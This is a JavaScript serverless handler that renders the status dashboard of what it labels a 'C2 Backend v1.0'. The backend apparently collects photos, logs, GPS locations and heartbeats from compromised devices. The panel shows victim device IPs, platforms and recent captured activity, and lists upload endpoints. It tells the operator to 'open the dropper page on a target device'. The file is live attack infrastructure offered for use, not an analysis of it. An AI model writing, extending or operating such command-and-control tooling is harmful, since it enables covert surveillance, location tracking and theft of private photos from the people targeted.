// ============================================================
//  TEST FILE — Modern Status Panel
//  Endpoint: /api/test
// ============================================================

const { createClient } = require('@supabase/supabase-js');

// ============================================================
//  SUPABASE CLIENT
// ============================================================
const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_SERVICE_KEY || process.env.SUPABASE_ANON_KEY;

let supabase = null;
if (supabaseUrl && supabaseKey) {
    supabase = createClient(supabaseUrl, supabaseKey);
}

// ============================================================
//  MAIN HANDLER
// ============================================================
module.exports = async (req, res) => {
    // Set CORS and content type
    res.setHeader('Content-Type', 'text/html');
    res.setHeader('Access-Control-Allow-Origin', '*');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // ============================================================
    //  RUN TESTS
    // ============================================================
    const results = {
        timestamp: new Date().toISOString(),
        env: {
            supabaseUrl: supabaseUrl ? '✅' : '❌',
            supabaseKey: supabaseKey ? '✅' : '❌'
        },
        supabase: { status: '⏳', error: null, deviceCount: 0 },
        bucket: { exists: false, buckets: [] },
        tables: { devices: '⏳', photos: '⏳', logs: '⏳', locations: '⏳', heartbeats: '⏳' },
        sample: { count: 0, devices: [] },
        recent: { photo: null, log: null, location: null }
    };

    // Test Supabase connection
    if (supabase) {
        try {
            const { data, error } = await supabase
                .from('devices')
                .select('count', { count: 'exact', head: true });
            if (error) {
                results.supabase.status = '❌';
                results.supabase.error = error.message;
            } else {
                results.supabase.status = '✅';
                results.supabase.deviceCount = data?.length || 0;
            }
        } catch (e) {
            results.supabase.status = '❌';
            results.supabase.error = e.message;
        }
    } else {
        results.supabase.status = '❌';
        results.supabase.error = 'Missing SUPABASE_URL or SUPABASE_KEY';
    }

    // Test bucket
    if (supabase && results.supabase.status === '✅') {
        try {
            const { data: buckets, error } = await supabase.storage.listBuckets();
            if (!error) {
                results.bucket.buckets = buckets.map(b => b.name);
                results.bucket.exists = buckets.some(b => b.name === 'photos');
            }
        } catch (e) {}
    }

    // Test tables
    if (supabase && results.supabase.status === '✅') {
        const tableNames = ['devices', 'photos', 'logs', 'locations', 'heartbeats'];
        for (const table of tableNames) {
            try {
                const { error } = await supabase
                    .from(table)
                    .select('count', { count: 'exact', head: true });
                results.tables[table] = error ? '❌' : '✅';
            } catch {
                results.tables[table] = '❌';
            }
        }
    }

    // Get sample devices
    if (supabase && results.supabase.status === '✅') {
        try {
            const { data, error } = await supabase
                .from('devices')
                .select('id, ip, platform, last_seen')
                .order('last_seen', { ascending: false })
                .limit(5);
            if (!error) {
                results.sample.count = data?.length || 0;
                results.sample.devices = data || [];
            }
        } catch (e) {}
    }

    // Get recent activity
    if (supabase && results.supabase.status === '✅') {
        try {
            const { data: p } = await supabase.from('photos').select('device_id, timestamp').order('timestamp', { ascending: false }).limit(1);
            results.recent.photo = p?.length > 0 ? p[0] : null;
            const { data: l } = await supabase.from('logs').select('device_id, message, timestamp').order('timestamp', { ascending: false }).limit(1);
            results.recent.log = l?.length > 0 ? l[0] : null;
            const { data: loc } = await supabase.from('locations').select('device_id, lat, lon, timestamp').order('timestamp', { ascending: false }).limit(1);
            results.recent.location = loc?.length > 0 ? loc[0] : null;
        } catch (e) {}
    }

    const allGreen = results.supabase.status === '✅' &&
                     results.bucket.exists === true &&
                     Object.values(results.tables).every(v => v === '✅');

    // ============================================================
    //  RENDER MODERN HTML PANEL
    // ============================================================
    return res.send(`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Status</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body {
            background: #0a0a12;
            color: #e0e0e0;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            background-image: radial-gradient(ellipse at 50% 0%, #1a1a2e 0%, #0a0a12 70%);
        }
        .container {
            width: 100%;
            max-width: 900px;
            animation: fadeUp 0.5s ease;
        }
        @keyframes fadeUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 16px;
            margin-bottom: 28px;
            padding: 16px 24px;
            background: rgba(20, 20, 31, 0.5);
            backdrop-filter: blur(20px);
            border-radius: 20px;
            border: 1px solid rgba(42, 42, 68, 0.3);
        }
        .header h1 {
            font-size: 24px;
            font-weight: 700;
            background: linear-gradient(135deg, #f7971e, #ffd200);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .header h1 span { font-size: 28px; -webkit-text-fill-color: initial; color: #ff3b3b; }
        .header .badge {
            padding: 4px 16px;
            border-radius: 60px;
            font-size: 12px;
            font-weight: 600;
            backdrop-filter: blur(10px);
        }
        .badge.success { background: rgba(26, 42, 26, 0.6); color: #6fcf97; border: 1px solid rgba(42, 74, 42, 0.4); }
        .badge.warning { background: rgba(42, 42, 26, 0.6); color: #ffaa44; border: 1px solid rgba(74, 74, 42, 0.4); }
        .badge.error { background: rgba(42, 26, 26, 0.6); color: #ff5e5e; border: 1px solid rgba(74, 42, 42, 0.4); }
        .badge .dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 6px; }
        .badge .dot.green { background: #6fcf97; }
        .badge .dot.yellow { background: #ffaa44; }
        .badge .dot.red { background: #ff5e5e; }

        .header .time { color: #4a6a7a; font-size: 13px; font-family: 'Courier New', monospace; }

        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            gap: 16px;
            margin-bottom: 20px;
        }
        .card {
            background: rgba(20, 20, 31, 0.5);
            backdrop-filter: blur(20px);
            border-radius: 16px;
            padding: 18px 20px;
            border: 1px solid rgba(42, 42, 68, 0.3);
            transition: all 0.3s ease;
        }
        .card:hover { border-color: rgba(247, 151, 30, 0.2); transform: translateY(-2px); }
        .card .label { font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; color: #4a6a7a; margin-bottom: 4px; }
        .card .value { font-size: 18px; font-weight: 600; display: flex; align-items: center; gap: 8px; }
        .card .value .icon { font-size: 20px; }
        .card .sub { font-size: 12px; color: #4a6a7a; margin-top: 4px; }

        .card-full { grid-column: 1 / -1; }

        .table-wrap {
            overflow-x: auto;
            margin-top: 6px;
        }
        .table-wrap table {
            width: 100%;
            border-collapse: collapse;
            font-size: 13px;
        }
        .table-wrap th {
            text-align: left;
            color: #4a6a7a;
            font-weight: 600;
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            padding: 6px 8px;
            border-bottom: 1px solid rgba(42, 42, 68, 0.2);
        }
        .table-wrap td {
            padding: 6px 8px;
            border-bottom: 1px solid rgba(42, 42, 68, 0.1);
            color: #aab;
        }
        .table-wrap td .status-icon { font-size: 16px; }
        .table-wrap tr:hover td { background: rgba(255,255,255,0.02); }

        .activity-item {
            padding: 6px 0;
            border-bottom: 1px solid rgba(42, 42, 68, 0.1);
            font-size: 13px;
            color: #aab;
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 4px;
        }
        .activity-item .time { color: #4a6a7a; font-size: 12px; }
        .activity-item .highlight { color: #88ccff; }

        @media (max-width: 600px) {
            .grid { grid-template-columns: 1fr; }
            .header { flex-direction: column; align-items: stretch; text-align: center; }
            .header .time { text-align: center; }
        }
        .text-center { text-align: center; }
        .mt-12 { margin-top: 12px; }
        .mt-20 { margin-top: 20px; }
        .mb-8 { margin-bottom: 8px; }
        .gap-4 { gap: 4px; }
        .flex { display: flex; align-items: center; }
        .flex-wrap { flex-wrap: wrap; }
        .footer-text { text-align: center; margin-top: 24px; font-size: 11px; color: #4a4a6a; }
        .footer-text a { color: #88ccff; text-decoration: none; }
        .footer-text a:hover { text-decoration: underline; }
        .code { font-family: 'Courier New', monospace; color: #88ccff; }
    </style>
</head>
<body>
<div class="container">

    <!-- HEADER -->
    <div class="header">
        <h1><span>☠️</span> System Status</h1>
        <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;">
            <span class="badge ${allGreen ? 'success' : 'warning'}">
                <span class="dot ${allGreen ? 'green' : 'yellow'}"></span>
                ${allGreen ? 'All Systems Ready' : 'Some Issues Detected'}
            </span>
            <span class="time">🕒 ${new Date(results.timestamp).toLocaleString()}</span>
            <a href="/api/test" style="color:#4a6a7a;text-decoration:none;font-size:13px;border:1px solid rgba(42,42,68,0.3);padding:4px 14px;border-radius:60px;">↻ Refresh</a>
        </div>
    </div>

    <!-- GRID -->
    <div class="grid">

        <!-- Supabase -->
        <div class="card">
            <div class="label">📦 Supabase</div>
            <div class="value">
                <span class="icon">${results.supabase.status === '✅' ? '🟢' : '🔴'}</span>
                ${results.supabase.status === '✅' ? 'Connected' : 'Failed'}
            </div>
            <div class="sub">${results.supabase.deviceCount > 0 ? `${results.supabase.deviceCount} devices registered` : 'No devices yet'}</div>
            ${results.supabase.error ? `<div class="sub" style="color:#ff5e5e;">${results.supabase.error}</div>` : ''}
        </div>

        <!-- Bucket -->
        <div class="card">
            <div class="label">📁 Storage Bucket</div>
            <div class="value">
                <span class="icon">${results.bucket.exists ? '🟢' : '🔴'}</span>
                ${results.bucket.exists ? 'photos ✅' : 'photos ❌'}
            </div>
            <div class="sub">${results.bucket.buckets.length > 0 ? `Buckets: ${results.bucket.buckets.join(', ')}` : 'No buckets found'}</div>
        </div>

        <!-- Devices -->
        <div class="card">
            <div class="label">📱 Devices</div>
            <div class="value">${results.sample.count}</div>
            <div class="sub">Registered devices</div>
        </div>

        <!-- Recent Activity -->
        <div class="card">
            <div class="label">⚡ Recent Activity</div>
            <div style="font-size:13px;color:#aab;margin-top:4px;line-height:1.8;">
                ${results.recent.photo ? `📸 ${new Date(results.recent.photo.timestamp).toLocaleTimeString()}` : 'No photos yet'}<br>
                ${results.recent.log ? `📋 ${new Date(results.recent.log.timestamp).toLocaleTimeString()}` : ''}<br>
                ${results.recent.location ? `📍 ${new Date(results.recent.location.timestamp).toLocaleTimeString()}` : ''}
            </div>
        </div>
    </div>

    <!-- TABLES STATUS -->
    <div class="card card-full">
        <div class="label">🗄️ Database Tables</div>
        <div class="table-wrap">
            <table>
                <thead><tr><th>Table</th><th>Status</th></tr></thead>
                <tbody>
                    ${Object.entries(results.tables).map(([name, status]) => `
                        <tr>
                            <td><span class="code">${name}</span></td>
                            <td><span class="status-icon">${status === '✅' ? '🟢' : '🔴'}</span> ${status}</td>
                        </tr>
                    `).join('')}
                </tbody>
            </table>
        </div>
    </div>

    <!-- SAMPLE DEVICES -->
    <div class="card card-full">
        <div class="label">📋 Recent Devices</div>
        ${results.sample.devices.length > 0 ? `
        <div class="table-wrap">
            <table>
                <thead><tr><th>IP</th><th>Platform</th><th>Last Seen</th></tr></thead>
                <tbody>
                    ${results.sample.devices.map(d => `
                        <tr>
                            <td><span class="code">${d.ip || 'unknown'}</span></td>
                            <td>${d.platform || 'unknown'}</td>
                            <td style="color:#4a6a7a;">${new Date(d.last_seen).toLocaleString()}</td>
                        </tr>
                    `).join('')}
                </tbody>
            </table>
        </div>
        ` : `<div style="color:#4a6a7a;padding:12px 0;">No devices registered yet. Open the dropper page on a target device.</div>`}
    </div>

    <!-- ENDPOINTS -->
    <div class="card card-full">
        <div class="label">🔗 Available Endpoints</div>
        <div style="display:flex;flex-wrap:wrap;gap:4px 16px;padding:8px 0;font-size:13px;color:#4a6a7a;font-family:'Courier New',monospace;">
            <div><span style="color:#88ccff;">POST</span> /api/register</div>
            <div><span style="color:#88ccff;">POST</span> /api/photo</div>
            <div><span style="color:#88ccff;">POST</span> /api/log</div>
            <div><span style="color:#88ccff;">POST</span> /api/location</div>
            <div><span style="color:#88ccff;">POST</span> /api/heartbeat</div>
            <div><span style="color:#6fcf97;">GET</span> /api/devices</div>
            <div><span style="color:#6fcf97;">GET</span> /api/photos?deviceId=xxx</div>
            <div><span style="color:#6fcf97;">GET</span> /api/logs?deviceId=xxx</div>
            <div><span style="color:#6fcf97;">GET</span> /api/locations?deviceId=xxx</div>
            <div><span style="color:#6fcf97;">GET</span> /api/test</div>
        </div>
    </div>

    <!-- FOOTER -->
    <div class="footer-text">
        🔐 Dashboard: <a href="https://angeljangra.github.io/dashboard/dashboard.html" target="_blank">Open Admin Panel</a>
        &nbsp;·&nbsp; ⚡ C2 Backend v1.0
    </div>
</div>
</body>
</html>`);
};
